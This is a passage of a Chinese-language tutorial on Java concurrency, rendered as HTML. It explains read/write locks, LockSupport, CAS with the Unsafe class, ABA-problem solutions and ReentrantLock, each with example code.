<h2 id="读-x2F-写锁"><a href="#读-x2F-写锁" class="headerlink" title="读&#x2F;写锁"></a>读&#x2F;写锁</h2><h3 id="ReentrantReadWriteLock"><a href="#ReentrantReadWriteLock" class="headerlink" title="ReentrantReadWriteLock"></a>ReentrantReadWriteLock</h3><p>ReentrantReadWriteLock是ReadWriteLock接口的实现类：<code>ReentrantReadWriteLock implements ReadWriteLock</code></p>
<p>ReadWriteLock支持由写锁将为读锁（锁降级）</p>
<p>ReentrantReadWriteLock的写锁（独占锁）用法示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WriteUsage</span> &#123;<br>    <span class="hljs-type">ReadWriteLock</span> <span class="hljs-variable">readWriteLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();<br>    <span class="hljs-type">Lock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> readWriteLock.writeLock(); <span class="hljs-comment">//ReadWriteLock的写锁（独占锁）</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeLockUsage</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeLock.lock();<br>            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;抢占锁成功&quot;</span>);<br>            Thread.sleep(<span class="hljs-number">1000</span>); <span class="hljs-comment">//使占有锁的线程运行一段时间后再释放</span><br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;sleeping&quot;</span>);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            writeLock.unlock();<br>            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;释放锁成功&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">WriteUsage</span> <span class="hljs-variable">writeUsage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WriteUsage</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>                System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;开始抢占锁&quot;</span>);<br>                writeUsage.writeLockUsage();<br>            &#125;).start();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    	输出的结果：</span><br><span class="hljs-comment">            Thread-1开始抢占锁</span><br><span class="hljs-comment">            Thread-4开始抢占锁</span><br><span class="hljs-comment">            Thread-3开始抢占锁</span><br><span class="hljs-comment">            Thread-0开始抢占锁</span><br><span class="hljs-comment">            Thread-2开始抢占锁</span><br><span class="hljs-comment">            Thread-1抢占锁成功</span><br><span class="hljs-comment">            Thread-1释放锁成功</span><br><span class="hljs-comment">            Thread-4抢占锁成功</span><br><span class="hljs-comment">            Thread-4释放锁成功</span><br><span class="hljs-comment">            Thread-3抢占锁成功</span><br><span class="hljs-comment">            Thread-3释放锁成功</span><br><span class="hljs-comment">            Thread-0抢占锁成功</span><br><span class="hljs-comment">            Thread-0释放锁成功</span><br><span class="hljs-comment">            Thread-2抢占锁成功</span><br><span class="hljs-comment">            Thread-2释放锁成功</span><br><span class="hljs-comment">        只有一个线程能够抢占到写锁</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>ReentrantReadWriteLock的读锁（共享锁）用法示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReadUsage</span> &#123;<br>    <span class="hljs-type">ReadWriteLock</span> <span class="hljs-variable">readWriteLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();<br>    <span class="hljs-type">Lock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> readWriteLock.readLock(); <span class="hljs-comment">//ReadWriteLock的读锁（共享锁）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readLockUsage</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            readLock.lock();<br>            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;抢占锁成功&quot;</span>);<br>            Thread.sleep(<span class="hljs-number">1000</span>); <span class="hljs-comment">//使占有锁的线程运行一段时间后再释放</span><br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;sleeping&quot;</span>);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            readLock.unlock();<br>            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;释放锁成功&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ReadUsage</span> <span class="hljs-variable">readUsage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReadUsage</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>                System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;开始抢占锁&quot;</span>);<br>                readUsage.readLockUsage();<br>            &#125;).start();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    	输出的结果：</span><br><span class="hljs-comment">            Thread-0开始抢占锁</span><br><span class="hljs-comment">            Thread-4开始抢占锁</span><br><span class="hljs-comment">            Thread-2开始抢占锁</span><br><span class="hljs-comment">            Thread-3开始抢占锁</span><br><span class="hljs-comment">            Thread-1开始抢占锁</span><br><span class="hljs-comment">            Thread-0抢占锁成功</span><br><span class="hljs-comment">            Thread-4抢占锁成功</span><br><span class="hljs-comment">            Thread-2抢占锁成功</span><br><span class="hljs-comment">            Thread-3抢占锁成功</span><br><span class="hljs-comment">            Thread-1抢占锁成功</span><br><span class="hljs-comment">            Thread-0释放锁成功</span><br><span class="hljs-comment">            Thread-2释放锁成功</span><br><span class="hljs-comment">            Thread-4释放锁成功</span><br><span class="hljs-comment">            Thread-1释放锁成功</span><br><span class="hljs-comment">            Thread-3释放锁成功</span><br><span class="hljs-comment">        多个线程都能够抢占到读锁</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br></code></pre></td></tr></table></figure>



<h3 id="StampedLock"><a href="#StampedLock" class="headerlink" title="StampedLock"></a>StampedLock</h3><p>StampedLock支持读锁、写锁、乐观锁三种模式。</p>
<h2 id="LockSupport原理"><a href="#LockSupport原理" class="headerlink" title="LockSupport原理"></a>LockSupport原理</h2><p>LockSupport位于<code>java.util.concurrent.locks</code>包，是Java提供的创建锁和其他多线程工具的基础类库，主要作用就是阻塞和唤醒线程，底层是基于UnSafe类实现的。AQS 底层就是使用了<code>LockSupport</code>来实现线程的阻塞和唤醒。</p>
<p>LockSupport类提供的核心方法：</p>
<img src="./Java并发编程/image-20230518115147049.png" alt="image-20230518115147049" style="zoom:80%;" />

<table>
<thead>
<tr>
<th>方法</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>public static void park()</td>
<td>阻塞当前线程</td>
</tr>
<tr>
<td>public static void park(Object blocker)</td>
<td>使用指定的 blocker（锁对象）阻塞当前线程</td>
</tr>
<tr>
<td>public static void parkNanos(long nanos)</td>
<td>阻塞当前线程，并指定了最长阻塞的时间，单位是纳秒</td>
</tr>
<tr>
<td>public static void parkUntil(long deadline)</td>
<td>阻塞当前线程，并指定了deadline时间点</td>
</tr>
<tr>
<td>public static void parkNanos(Object blocker, long nanos)</td>
<td>阻塞当前线程，并指定了使用的 blocker（锁对象）、最长阻塞的时间，单位是纳秒</td>
</tr>
<tr>
<td>public static void parkUntil(Object blocker, long deadline)</td>
<td>阻塞当前线程，并指定了使用的 blocker（锁对象）、deadline时间点</td>
</tr>
<tr>
<td>public static void unpark(Thread thread)</td>
<td>解除指定已被park的线程的阻塞状态；如果线程已经启动但还未park，就取消下一次的park。</td>
</tr>
</tbody></table>
<p>在底层实现上，<code>LockSupport</code>使用了一种名为”许可（Permit）”的概念来控制阻塞和唤醒。Permit的数量最多为1。</p>
<p>如果线程已经拿到了Permit，则调用<code>LockSupport.park()</code>会立即返回；如果没有拿到Permit，<code>park()</code>方法会阻塞线程。调用<code>LockSupport.unpark(Thread)</code>方法会给指定的线程发放Permit。</p>
<p>unpark()可以先于park()调用：如果 <code>unpark(thread)</code> 在 <code>park()</code> 之前被调用，那么线程会获得一个Permit，当后续 <code>park()</code> 被调用时，线程可以立即消费掉这个Permit并继续执行，而不会阻塞。</p>
<p>如果调用者的线程被中断，park 将返回。</p>
<p>下面是一个简单的<code>LockSupport</code>使用例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockSupportExample</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;Child thread begin park!&quot;</span>);<br><br>            <span class="hljs-comment">// 调用park方法，挂起自己</span><br>            LockSupport.park();<br><br>            System.out.println(<span class="hljs-string">&quot;Child thread end park!&quot;</span>);<br>        &#125;);<br><br>        thread.start();<br><br>        <span class="hljs-comment">// 主线程延迟2s</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(<span class="hljs-number">2000</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;Main thread begin unpark!&quot;</span>);<br><br>        <span class="hljs-comment">// 调用unpark方法让thread线程持有许可证，然后park方法返回</span><br>        LockSupport.unpark(thread);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，子线程通过调用<code>LockSupport.park()</code>方法阻塞自己，主线程在延迟2秒后调用<code>LockSupport.unpark(thread)</code>方法唤醒子线程。</p>
<h1 id="CAS核心原理"><a href="#CAS核心原理" class="headerlink" title="CAS核心原理"></a>CAS核心原理</h1><h2 id="CAS的基本概念"><a href="#CAS的基本概念" class="headerlink" title="CAS的基本概念"></a>CAS的基本概念</h2><blockquote>
<p>将内存位置的内容与给定值进行比较，只有当它们相同时，才将该内存位置的内容修改为新的给定值</p>
</blockquote>
<p>CAS（Compare And Swap）是一种无锁编程算法，属于乐观锁。</p>
<p>CAS以原子性的方式更新共享变量的数据，能够保证线程安全。</p>
<p>CAS算法的使用包含以下步骤（假设新值是基于共享变量的旧值计算得到的，比如加1操作）：</p>
<ol>
<li>读取到的共享变量的值是prev</li>
<li>确定要修改的值是next（如next&#x3D;prev+1）</li>
<li>再次读取共享变量的值是cur，并比较prev和cur是否一样，即计算得到next的操作前后共享变量的值是否发生了改变。如果没有发生改变就更新共享变量的值为next；如果发生了改变，则重新从第一步开始执行，或者根据需要结束执行。</li>
</ol>
<p>AtomicInteger的getAndUpdate方法的实现就体现了这一点：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAndUpdate</span><span class="hljs-params">(IntUnaryOperator updateFunction)</span> &#123;<br>    <span class="hljs-type">int</span> prev, next;<br>    <span class="hljs-keyword">do</span> &#123;<br>        prev = get();<br>        next = updateFunction.applyAsInt(prev);<br>    &#125; <span class="hljs-keyword">while</span> (!compareAndSet(prev, next));<br>    <span class="hljs-keyword">return</span> prev;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CAS的核心类Unsafe"><a href="#CAS的核心类Unsafe" class="headerlink" title="CAS的核心类Unsafe"></a>CAS的核心类Unsafe</h2><p>Unsafe类是Java中实现CAS操作的核心类，位于sun.misc包，在UnSafe类中提供了大量的native方法，通过JNI的方式调用JVM底层的C和C++实现的方法。java.util.concurrent.atomic包下提供的原子类底层操作都是基于Unsafe类实现的。</p>
<p>使用Unsafe的CAS方法实现count++：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CasCountIncrement</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">singleOneInstanceField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            singleOneInstanceField.setAccessible(<span class="hljs-literal">true</span>);<br>            unsafe = (Unsafe) singleOneInstanceField.get(<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> unsafe;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">THREAD_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">EXECUTE_COUNT_EACH_THREAD</span> <span class="hljs-operator">=</span> <span class="hljs-number">500</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-variable">countOffset</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            countOffset = unsafe.objectFieldOffset(CasCountIncrement.class.getDeclaredField(<span class="hljs-string">&quot;count&quot;</span>));<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">incrementCountByCas</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">oldCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            oldCount = count;<br>        &#125; <span class="hljs-keyword">while</span> (!unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, countOffset, oldCount, oldCount + <span class="hljs-number">1</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-type">CasCountIncrement</span> <span class="hljs-variable">casCountIncrement</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CasCountIncrement</span>();<br>        <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">countDownLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(THREAD_COUNT);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; THREAD_COUNT; i++) &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>                IntStream.range(<span class="hljs-number">0</span>, EXECUTE_COUNT_EACH_THREAD).forEach((j) -&gt; &#123;<br>                    casCountIncrement.incrementCountByCas();<br>                &#125;);<br>                countDownLatch.countDown();<br>            &#125;).start();<br>        &#125;;<br>        countDownLatch.await();<br>        System.out.println(<span class="hljs-string">&quot;count = &quot;</span> + casCountIncrement.count); <span class="hljs-comment">//count = 10000</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="ABA问题的解决方案"><a href="#ABA问题的解决方案" class="headerlink" title="ABA问题的解决方案"></a>ABA问题的解决方案</h2><p>java中的java.util.concurrent.atomic包下提供了AtomicStampedReference类和AtomicMarkableReference类来解决ABA问题。</p>
<p>区别是：</p>
<ol>
<li>AtomicStampedReference使用的是int类型的stamp，可以区分每一次的修改</li>
<li>AtomicMarkableReference使用的是boolean类型的mark，只能判断有没有修改过</li>
</ol>
<p>实现源码：</p>
<ol>
<li><p>AtomicStampedReference：在CAS的基础上增加了stamp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Params:</span><br><span class="hljs-comment">    expectedReference – the expected value of the reference </span><br><span class="hljs-comment">    newReference – the new value for the reference </span><br><span class="hljs-comment">    expectedStamp – the expected value of the stamp </span><br><span class="hljs-comment">    newStamp – the new value for the stamp</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(V expectedReference,</span><br><span class="hljs-params">                             V newReference,</span><br><span class="hljs-params">                             <span class="hljs-type">int</span> expectedStamp,</span><br><span class="hljs-params">                             <span class="hljs-type">int</span> newStamp)</span> &#123;<br>    Pair&lt;V&gt; current = pair;<br>    <span class="hljs-keyword">return</span><br>        expectedReference == current.reference &amp;&amp;<br>        expectedStamp == current.stamp &amp;&amp;<br>        ((newReference == current.reference &amp;&amp;<br>          newStamp == current.stamp) ||<br>         casPair(current, Pair.of(newReference, newStamp)));<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>AtomicMarkableReference：在CAS的基础上增加了mark</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Params:</span><br><span class="hljs-comment">    expectedReference – the expected value of the reference </span><br><span class="hljs-comment">    newReference – the new value for the reference </span><br><span class="hljs-comment">    expectedMark – the expected value of the mark </span><br><span class="hljs-comment">    newMark – the new value for the mark</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(V expectedReference,</span><br><span class="hljs-params">                             V newReference,</span><br><span class="hljs-params">                             <span class="hljs-type">boolean</span> expectedMark,</span><br><span class="hljs-params">                             <span class="hljs-type">boolean</span> newMark)</span> &#123;<br>    Pair&lt;V&gt; current = pair;<br>    <span class="hljs-keyword">return</span><br>        expectedReference == current.reference &amp;&amp;<br>        expectedMark == current.mark &amp;&amp;<br>        ((newReference == current.reference &amp;&amp;<br>          newMark == current.mark) ||<br>         casPair(current, Pair.of(newReference, newMark)));<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<h1 id="JUC同步锁"><a href="#JUC同步锁" class="headerlink" title="JUC同步锁"></a>JUC同步锁</h1><p>以下的锁当中除了LockSupport之外，其他的都是基于AQS实现的</p>
<img src="./Java并发编程/image-20230517170215865.png" alt="image-20230517170215865" style="zoom:80%;" />

<h2 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h2><p>ReentrantLock是Java并发包<code>java.util.concurrent.locks</code>中的一个类，ReentrantLock是可重入锁，每获取一次，重入的计数就会增加1。当线程释放锁时，重入的计数就会减少1。只有当重入的计数变为0时，锁才会真正被释放。</p>
<p><code>ReentrantLock</code>是基于Java的<code>AbstractQueuedSynchronizer</code>(AQS)框架实现的。AQS使用一个整数值来表示锁的状态，并使用一个FIFO队列来管理等待的线程。ReentrantLock底层使用的是锁的park()和unpark()</p>
<p>要使用<code>ReentrantLock</code>，需要创建一个<code>ReentrantLock</code>的实例，然后在需要互斥访问的代码前调用<code>lock()</code>方法，代码后调用<code>unlock()</code>方法。为了确保锁可以被正确释放，通常需要将<code>unlock()</code>方法放在<code>finally</code>块中。下面是一个例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.concurrent.locks.ReentrantLock;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantLockExample</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomething</span><span class="hljs-params">()</span> &#123;<br>        lock.lock();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// critical section</span><br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            lock.unlock();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，<code>doSomething</code>方法中的代码是互斥的，也就是说，在任何时刻，最多只有一个线程可以执行这段代码。</p>
<p>ReentrantLock提供了比内置<code>synchronized</code>关键字更强大更灵活的锁机制。</p>
<p>ReentrantLock比synchronized增加的功能：</p>
<ol>
<li>ReentrantLock可以设置等待时间，如果超时未得到锁，可以进入finally里面解除获取锁的操作</li>
<li>ReentrantLock可以使用可打断的等待lock.lockInterruptibly()，其他线程打断可打断的等待线程之后，等待线程就可以进入被打断的catch</li>
<li>ReentrantLock还支持公平锁，synchronized只支持非公平锁。公平锁模式可以防止线程饥饿，但是在性能上通常不如非公平锁模式。ReentrantLock使用公平锁的方式是往够早函数里面传一个true参数，即new ReentrantLock(true)。</li>
</ol>
<p><strong>lock.lock();是写在try里面还是外面</strong></p>
<p>在使用 <code>Lock</code> 的时候，通常建议将 <code>lock.lock();</code> 写在 <code>try</code> 块的外面，然后在 <code>finally</code> 块中释放锁。例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();<br><br>lock.lock();<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// access shared resources</span><br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    lock.unlock();<br>&#125;<br></code></pre></td></tr></table></figure>

